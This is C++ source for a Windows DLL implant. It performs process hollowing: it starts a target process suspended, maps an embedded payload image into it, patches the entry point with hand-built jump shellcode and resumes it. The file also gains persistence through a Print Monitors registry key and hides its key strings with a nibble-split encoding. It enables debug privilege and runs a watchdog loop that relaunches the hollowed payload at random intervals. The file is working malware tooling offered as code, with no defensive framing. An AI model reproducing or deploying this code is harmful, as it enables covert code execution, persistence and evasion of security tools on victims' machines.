// ProcessHollowing.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include "ph.h"
#include <time.h>
#include <sstream>


#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")

FILE * debug_file_handle = stdout;

//Flag to determine if we are the target or watcher
bool watch_target = false;

extern "C" __declspec (dllexport) void __cdecl RegisterDll (
   HWND hwnd,        // handle to owner window
   HINSTANCE hinst,  // instance handle for the DLL
   LPTSTR lpCmdLine, // string the DLL will parse
   int nCmdShow      // show state
){
  //::MessageBox(0,lpCmdLine,0,0);
}


/*
 * Current DLL hmodule.
 */
static HMODULE dll_handle = NULL;

char * decode_split( const char * input, unsigned int str_len ){

	char *test;
	unsigned int i =0, j = 0;
	if( str_len % 2 == 0 ){

		test = (char *)calloc((str_len/2) + 1, 1);
		for( i = 0, j = 0; i < str_len; i += 2, j++ ){
			test[j] = input[i] << 4;
			test[j] += input[i+1];
		}
		
	} else {

		test = (char *)calloc(0, 1);
	}

	return test;
}

PEB_PARTIAL ReadRemotePEB(HANDLE hProcess, LPVOID dwPEBAddress )
{
	PEB_PARTIAL pPEB;
	memset(&pPEB, 0, sizeof(PEB_PARTIAL));
	
	BOOL bSuccess = ReadProcessMemory
		(
		hProcess,
		(LPCVOID)((size_t)dwPEBAddress),
		&pPEB,
		sizeof(pPEB),
		0
		);
	
	return pPEB;
}

int enableSEPrivilege(LPCTSTR name) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) return 0;

    if(!LookupPrivilegeValue(NULL, name, &luid)) return 0;

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) return 0;

	if(GetLastError() == ERROR_NOT_ALL_ASSIGNED) return 0;

	CloseHandle(hToken);
	return 1;
}


bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize) {
	HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.

	//Get the resource
	hRes = FindResource(dll_handle, MAKEINTRESOURCE(resID) ,"BIN");
	if( hRes == nullptr ) { 
#ifdef _DBG
			fprintf( debug_file_handle,"Unable to find resource.\r\n");
#endif
		return false;
	}

    hResourceLoaded = LoadResource(dll_handle, hRes);
	if( hResourceLoaded == nullptr ) {
#ifdef _DBG
			fprintf( debug_file_handle,"Unable to load resource.\r\n");
#endif
		return false;
	}

    *ImgResData = (char *)LockResource(hResourceLoaded);
	if( hResourceLoaded == nullptr ) {
#ifdef _DBG
			fprintf( debug_file_handle,"Unable to lock resource.\r\n");
#endif
		return false;
	}

    *sourceImgSize = SizeofResource(dll_handle, hRes);
#ifdef _DBG
	fprintf( debug_file_handle,"file size %d\n", *sourceImgSize);
#endif

	return true;
}


DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_entry )
{
	NTSTATUS stat;
	
#ifdef _DBG
		fprintf( debug_file_handle,"Creating process\r\n");
   #endif

	//Start the target process suspended
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	if (!CreateProcess((LPSTR)pDestCmdLine, NULL, NULL, NULL, NULL,
					CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW,
					NULL, NULL, pStartupInfo, pProcessInfo))
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] CreateProcessW failed. Error = %x\n", GetLastError());
#endif
		return 0;
	}

	//Resolve necessary functions
	ZwQueryInformationProcess = (long (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwQueryInformationProcess");
	ZwMapViewOfSection = (long (__stdcall *)(HANDLE,HANDLE,PVOID *,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwMapViewOfSection");
	ZwUnmapViewOfSection = (long (__stdcall *)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"),"ZwUnmapViewOfSection");
	ZwCreateSection = (long (__stdcall *)(PHANDLE,ACCESS_MASK,PDWORD,PLARGE_INTEGER,ULONG,ULONG,HANDLE))GetProcAddress(GetModuleHandleA("ntdll"),"ZwCreateSection");

	if (ZwMapViewOfSection == NULL || ZwQueryInformationProcess == NULL || ZwUnmapViewOfSection == NULL || ZwCreateSection == NULL)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] GetProcAddress failed\n");
#endif
		return 0;
	}

	//Get process information
	PROCESS_BASIC_INFORMATION pbi;
	if (ZwQueryInformationProcess(pProcessInfo->hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {

#ifdef _DBG
		fprintf(debug_file_handle,"[-] ZwQueryInformation failed\n");
#endif
		return 0;
    }


#ifdef _DBG
	fprintf(debug_file_handle, "[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
#endif
	PEB_PARTIAL peb_struct = (PEB_PARTIAL)ReadRemotePEB(pProcessInfo->hProcess , pbi.PebBaseAddress );
	PVOID ImageBase = peb_struct.ImageBaseAddress;

#ifdef _DBG
	fprintf(debug_file_handle, "[+] ImageBase = 0x%x\n", ImageBase);
#endif

	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, (LPCVOID)ImageBase);
	SIZE_T image_size = pImage->FileHeader->OptionalHeader.SizeOfImage;
	SIZE_T rem_entry_pt = pImage->FileHeader->OptionalHeader.AddressOfEntryPoint;	

	SIZE_T nb_read;
	char *read_proc = (char *)malloc(image_size);
	if (!ReadProcessMemory(pProcessInfo->hProcess, (LPCVOID)ImageBase, read_proc, image_size, &nb_read) )
	{

#ifdef _DBG
		fprintf(debug_file_handle, "[-] ReadProcessMemory failed\n");
#endif
		return 0;
	}


//****************************************************************************************************************


	//Load replacement image
	PLOADED_IMAGE pSourceImage = GetLoadedImage((BYTE *)ImgData);

	LARGE_INTEGER a;
	a.QuadPart = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	HANDLE image_sect;
	if ((stat = ZwCreateSection(&image_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}

	SIZE_T size;
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;

	PVOID BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}	

	//Unmap the test location
	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);
	PVOID RemoteAddress = BaseAddress;

	//Set size
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(image_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}	
		
	#ifdef _M_IX86
		PIMAGE_NT_HEADERS32 ptr = (PIMAGE_NT_HEADERS32)(pSourceImage->FileHeader);
	#endif 

	#ifdef _M_X64
		PIMAGE_NT_HEADERS64 ptr = (PIMAGE_NT_HEADERS64)(pSourceImage->FileHeader);
	#endif 

	//Get the address of the entry point
	PVOID addr = (PVOID)&ptr->OptionalHeader.ImageBase;
	PVOID beg = (PVOID)ptr;
	size_t diff = (size_t)addr - (size_t)beg;
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ImgData;
	size_t image_base = pDOSHeader->e_lfanew + diff;
		
	//copy the headers to the dest buffer
	memcpy(	BaseAddress, ImgData, pSourceImage->FileHeader->OptionalHeader.SizeOfHeaders );
	
	//Image entry
#ifdef _DBG
	fprintf(debug_file_handle, "Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
#endif 

	//Base before
	size_t before = 0;
	memcpy(&before, (PVOID)((size_t)BaseAddress + image_base), sizeof(before)); 
	
#ifdef _DBG
	fprintf(debug_file_handle, "Base before: %p\n", before);
#endif 


	//Copy updated image base address
	memcpy((PVOID)((size_t)BaseAddress + image_base), &RemoteAddress, sizeof(RemoteAddress)); 

	//Copy each section of the replacement binary
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((size_t)BaseAddress + pSourceImage->Sections[x].VirtualAddress);

		#ifdef _DBG
			fprintf( debug_file_handle,"Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
		#endif

		memcpy( pSectionDestination, &ImgData[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData);
	}	


#ifdef _DBG
	fprintf( debug_file_handle,
			"Source image base: 0x%p\r\n"
			"Destination image base: 0x%p\r\n",
			pSourceImage->FileHeader->OptionalHeader.ImageBase,
			RemoteAddress
	);
#endif

	//Get the difference between the new destination memory address and the image base
	size_t dwDelta = 0;
	boolean subtract = false;
	if ( (size_t)RemoteAddress >= (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase )
		dwDelta =  (size_t)RemoteAddress - (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase;	
	else {
		dwDelta = (size_t)pSourceImage->FileHeader->OptionalHeader.ImageBase - (size_t)RemoteAddress;
		subtract = true;
	}
	

	#ifdef _DBG
		fprintf( debug_file_handle,"Relocation delta: 0x%p\r\n", dwDelta);
		fprintf( debug_file_handle,"Writing headers\r\n");
	#endif

    // Rebase image if necessary, x86 and x64
	if (dwDelta){

		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char* pSectionName = ".reloc";		

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			#ifdef _DBG
				fprintf( debug_file_handle,"Rebasing image\r\n");
			#endif

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = 
				pSourceImage->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&ImgData[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&ImgData[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
					size_t dwBuffer = 0;

					//Copy the address from memory
					memcpy(&dwBuffer, (PVOID)((size_t)BaseAddress + dwFieldAddress), sizeof(dwBuffer));

					//Update it
					if( subtract )
						dwBuffer -= dwDelta;
					else
						dwBuffer += dwDelta;

					//Copy back the fixed up address
					memcpy((PVOID)((size_t)BaseAddress + dwFieldAddress), &dwBuffer, sizeof(dwBuffer));
	
				}
			}

			break;
		}

	}

	////Load any dll import needed by the program
	//LoadDllImports( BaseAddress );

	//Map the orginial over our data
	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}


//*************************************************************************************************

	size = image_size;
	a.QuadPart = size;
	HANDLE entry_sect;
	if ((stat = ZwCreateSection(&entry_sect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}

	//Set size
	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(entry_sect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}	
	
	//Entrypoint addr
	size_t entr_addr = (size_t)RemoteAddress + pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint;
	DWORD counter = 0;	
	unsigned int sc_size = 0x50;
	unsigned char jmpshellcode[0x50];
	memset(jmpshellcode, 0, sc_size);

	//Add breakpoint
#ifdef _DBG
//	*(unsigned char *)&jmpshellcode[counter++] = 0xcc;	   // breakpoint
#endif


	//Add reason and dll entry load addr
	if( dll_entry ){

#ifdef _M_X64

		//Add Reserved to R8
		*(unsigned char *)&jmpshellcode[counter++] = 0x49;
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV R8, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = 0x12;
		counter = counter + sizeof(size_t);

		//Add DLL reason to RDX
		*(unsigned char *)&jmpshellcode[counter++] = 0x48;
		*(unsigned char *)&jmpshellcode[counter++] = 0xba;	   // MOV RDX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = 0x1;
		counter = counter + sizeof(size_t);

		//Base Addr to RCX
		*(unsigned char *)&jmpshellcode[counter++] = 0x48;
		*(unsigned char *)&jmpshellcode[counter++] = 0xb9;	   // MOV RCX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = (size_t)RemoteAddress;
		counter = counter + sizeof(size_t);

#else
		//POP RETURN PTR 
		*(unsigned char *)&jmpshellcode[counter++] = 0x59;     // POP ECX

		//Add Reserved
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = 0x12;
		counter = counter + sizeof(size_t);

		//PUSH 
		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX

		//Add dll attach type parameter
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
		*(DWORD *) &jmpshellcode[counter] = 0x1;
		counter = counter + sizeof(DWORD);

		//PUSH 
		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX

		//Add process base address
		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
		*(size_t *) &jmpshellcode[counter] = (size_t)RemoteAddress;
		counter = counter + sizeof(size_t);

		//PUSH 
		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX

		//PUSH RETURN PTR 
		*(unsigned char *)&jmpshellcode[counter++] = 0x51;     // PUSH ECX

#endif

	}

	
#ifdef _M_X64
	*(unsigned char *)&jmpshellcode[counter++] = 0x48;
#endif

	*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
	*(size_t *) &jmpshellcode[counter] = entr_addr;
	counter = counter + sizeof(size_t);

	//PUSH address of entry point
	*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
	*(unsigned char *)&jmpshellcode[counter++] = 0xc3;     // RET

	//copy the binary to the mapped buffer
	memcpy((BYTE*)read_proc + rem_entry_pt, jmpshellcode, sizeof(jmpshellcode));
	memcpy(BaseAddress, read_proc, image_size);
	BaseAddress = (PVOID)ImageBase;

	//Unmap the orginal image
	ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress);

	//Map the orginial over our data
	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
#ifdef _DBG
		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
#endif
		return 0;
	}

	//*********************
	//Write the new ImageBase to the PEB or it will not work
	//*********************
	WriteProcessMemory (
		pProcessInfo->hProcess,
		(LPVOID)((size_t) pbi.PebBaseAddress + (sizeof(size_t) * 2)),
		&RemoteAddress,
		sizeof(RemoteAddress),
		0
	);

	//Resume execution
	ResumeThread(pProcessInfo->hThread);
	//system("pause");

	return pProcessInfo->dwProcessId;

}


void DllPersistence( char *module_path ){

	//Get dll name from resource table
    char reg_str_buf[200];
	LoadString(dll_handle, IDS_REG_KEY, reg_str_buf, 200);
	if( strlen( reg_str_buf ) != 0 ){	
		
		//Deobfuscate it
		char *reg_ptr = decode_split(reg_str_buf, 200);
		std::string reg_str(reg_ptr);
		free(reg_ptr);
		//Try to open registry key (SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\)
		char *keyPath = decode_split("\x5\x3\x5\x9\x5\x3\x5\x4\x4\x5\x4\xd\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\x3\x6\x5\x7\x4\x5\xc\x4\x3\x6\xf\x6\xe\x7\x4\x7\x2\x6\xf\x6\xc\x5\xc\x5\x0\x7\x2\x6\x9\x6\xe\x7\x4\x5\xc\x4\xd\x6\xf\x6\xe\x6\x9\x7\x4\x6\xf\x7\x2\x7\x3\x5\xc",96);
		std::string reg_key_path(keyPath);
		free(keyPath);

		//Add the name
		reg_key_path.append(reg_str);
						
		//Check if reg key has been set for persistence
		HKEY hkey = NULL;
		long ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hkey);
		if(ret == ERROR_FILE_NOT_FOUND ) {

			//Create the key
			DWORD dwDisposition;
			if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, reg_key_path.c_str(), 0, NULL, 0, KEY_WRITE, NULL,  &hkey, &dwDisposition) == ERROR_SUCCESS) {

				//Driver
				char *driver_ptr = decode_split("\x4\x4\x7\x2\x6\x9\x7\x6\x6\x5\x7\x2",12);
				ret = RegSetValueEx (hkey, driver_ptr, 0, REG_SZ, (LPBYTE)module_path, strlen(module_path));
				if ( ret != ERROR_SUCCESS) {
#ifdef _DBG
					fprintf(debug_file_handle, "[-] Error: Unable to write registry value.\n");
#endif
				}
				free(driver_ptr);
				RegCloseKey(hkey);
			}

		}
	}
		

}

int main(int argc, char* argv[]){
	
	//Check the global else load the watchdog
	if( watch_target ){

		LoadPayload();
		exit(1);

	} else {	

		LoadWatchDog();
	}
	
}

//====================================================================
/*
*
*	Function for loading the watchdog process
*
*/
void LoadWatchDog() {

#ifdef _DBG
	FILE *f;
	fopen_s(&f, "C:\\debug_dll.log", "w");
	if( f == nullptr )
		return;

	setvbuf(f, NULL, _IONBF, 0);
	debug_file_handle = f;
#endif

	HANDLE hFile;
	char module_name[MAX_PATH];
	int dwLength = 0;
	char *imgBuffer = NULL;
	DWORD imgBufferSize = 0, bytesRead = 0;


	//Get watch dog host path
    char watchdog_host[400];
	LoadString(dll_handle, IDS_WATCHDOG_HOST, watchdog_host, 400);
	if( strlen( watchdog_host ) == 0 ){
#ifdef _DBG
		fprintf( debug_file_handle, "[-] Error: Watchdog host path not set. Exiting\n");
		fclose(debug_file_handle);
#endif
		return;
	}

	//Deobfuscate it
	char *watchdog_host_ptr = decode_split(watchdog_host, 400);
	std::string hollow_proc_str(watchdog_host_ptr);
	free(watchdog_host_ptr);

		
	memset(module_name, 0, MAX_PATH );

	//Get the dll module name
	dwLength = GetModuleFileName(dll_handle, module_name, MAX_PATH);

	//open file and read its contents
	hFile = CreateFile(module_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile != INVALID_HANDLE_VALUE) {
		imgBufferSize = GetFileSize(hFile, NULL);
		if(imgBufferSize != INVALID_FILE_SIZE) {
			imgBuffer = (char *)malloc(imgBufferSize+1);
			if(imgBuffer)
				ReadFile(hFile, imgBuffer, imgBufferSize, &bytesRead, NULL);

		}
		CloseHandle(hFile);
	} 
		
	//Add registry persistence
	DllPersistence(module_name);

	//Create an env variable with the name of the dll
	if (! SetEnvironmentVariable("TMP", module_name )) {
#ifdef _DBG
		fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
		fclose(debug_file_handle);
#endif
        return;
    }

	//create new hollowed process and fill with loader
	if((imgBufferSize > 0) && imgBufferSize == bytesRead) {
		
		//If the process string is not empty
		if(hollow_proc_str.length() > 0)
			CreateHollowedProcess(hollow_proc_str.c_str(), imgBuffer, true );

	}
	
	if(imgBuffer)
		free(imgBuffer);

#ifdef _DBG
	fclose(debug_file_handle);
#endif

}

void LoadPayload(){


#ifdef _DBG
	FILE *f;
	fopen_s(&f, "C:\\debug_dll2.log", "w");
	if( f == nullptr )
		return;

	setvbuf(f, NULL, _IONBF, 0);
	debug_file_handle = f;
#endif
	
	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);

	//Set java home
	//Get authentication string from resource table
    char auth_str_buf[200];
	LoadString(dll_handle, IDS_JVM_PATH, auth_str_buf, 200);
	if( strlen( auth_str_buf ) != 0 ){

		//Deobfuscate it
		char *auth_ptr = decode_split(auth_str_buf, 200);
		std::string authStr(auth_ptr);
		free(auth_ptr);

#ifdef _DBG
		fprintf( debug_file_handle,"JVM Path: %s, Length: %d\n", authStr.c_str(), authStr.length());
#endif

		//Create an env variable with the name of the dll
		//PS_HOME
		char *java_home = decode_split("\x5\x0\x5\x3\x5\xf\x4\x8\x4\xf\x4\xd\x4\x5",14);
		if (! SetEnvironmentVariable(java_home, authStr.c_str()) ) 
		{
	#ifdef _DBG
			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
			fclose(debug_file_handle);
	#endif
			free(java_home);
			return;
		}
		//free mem
		free(java_home);

	}
	
    //String holding the dll path and pid
	std::string dll_path_pid;
	size_t len;

	//TEMP
	char *temp_ptr = decode_split("\x5\x4\x4\x5\x4\xd\x5\x0",8);
	//Get TEMP env
	char * temp_env = nullptr;
	_dupenv_s (&temp_env, &len, temp_ptr);
	free(temp_ptr);

	//TMP
	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);

	//Get TMP env - this is the one we set in proc hollow
	char * tmp_env = nullptr;
	_dupenv_s (&tmp_env, &len, tmp_ptr);
	if( tmp_env && strlen(tmp_env) > 0 ){
		//Create string stream
		std::stringstream ss;
		ss << tmp_env << "|" << GetCurrentProcessId();
		dll_path_pid.assign(ss.str());

		//Free memory
		free(tmp_env);

		//Create an env variable with the name of the dll
		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
	#ifdef _DBG
			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
			fclose(debug_file_handle);
	#endif
			return;
		}
	}

	//Get payload host path
    char payload_host[400];
	LoadString(dll_handle, IDS_PAYLOAD_HOST, payload_host, 400);
	if( strlen( payload_host ) == 0 ){
#ifdef _DBG
		fprintf( debug_file_handle, "[-] Error: Payload host path not set. Exiting\n");
		fclose(debug_file_handle);
#endif
		return;
	}

	//Deobfuscate it
	char *payload_host_ptr = decode_split(payload_host, 400);
	std::string hollow_proc_str(payload_host_ptr);
	free(payload_host_ptr);

	char *imgResData = NULL;
	DWORD imgDataSize = 0;

	//Get the resource buffer
	if( !GetResourceImageBuffer(IDR_BIN1, &imgResData, &imgDataSize) ){
#ifdef _DBG
		fprintf( debug_file_handle, "[-] Error: Unable to get resource.\n");
		fclose(debug_file_handle);
#endif
		return;
	}

	//Initialize rand
	srand ( (unsigned int )time(NULL));

	//Create new process repeatedly
	while( 1 ){

		DWORD proc_pid = CreateHollowedProcess( hollow_proc_str.c_str(), imgResData, false );
		HANDLE proc_handle = OpenProcess( SYNCHRONIZE, TRUE, proc_pid);

		//Reset
		if( temp_env && (strcmp(tmp_env, temp_env) != 0)  ){		
			//Set TMP back to TEMP
			SetEnvironmentVariable(tmp_ptr, temp_env);
			
		} else {
			//Reset TMP var
			SetEnvironmentVariable(tmp_ptr, "");
		}

		WaitForSingleObject(proc_handle, INFINITE );
			
		//Range from 3 mins to 8
		unsigned int rand_num =  ( rand() % (1000 * 60 * 5) ) + (1000 * 60 * 3);
		Sleep(rand_num);

#ifdef _DBG
		fprintf( debug_file_handle,"Restarting monitored process.");
#endif
		//Set it back
		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
	#ifdef _DBG
			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
			fclose(debug_file_handle);
	#endif
			return;
		}

	}
	

	
	//Free memory
	free(tmp_ptr);

#ifdef _DBG
	fclose(debug_file_handle);
#endif


}

//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;
	unsigned int ret =0;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			dll_handle = (HMODULE)hinstDLL;

			//If the reserved flag is set, we are the injected process
			if( lpReserved )
				watch_target = true;

			main(0, nullptr);

		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

